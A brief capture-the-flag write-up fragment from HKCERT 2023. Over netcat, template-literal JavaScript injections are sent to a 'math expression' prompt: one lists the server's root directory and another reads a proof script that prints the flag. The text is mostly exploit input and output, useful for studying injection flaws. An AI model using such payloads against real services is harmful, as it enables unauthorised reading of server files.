```
$ nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
`${this.fs.readdirSync('/')}`
bin,boot,data,dev,docker-entrypoint-initdb.d,etc,home,js-yaml.js,lib,lib32,lib64,libx32,media,mnt,opt,proc,proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh,root,run,sbin,srv,sys,tmp,usr,var

$ nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
`${this.fs.readFileSync('/proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh')}`
#!/bin/sh
echo hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}
```

> But why making it executable and changing the name...
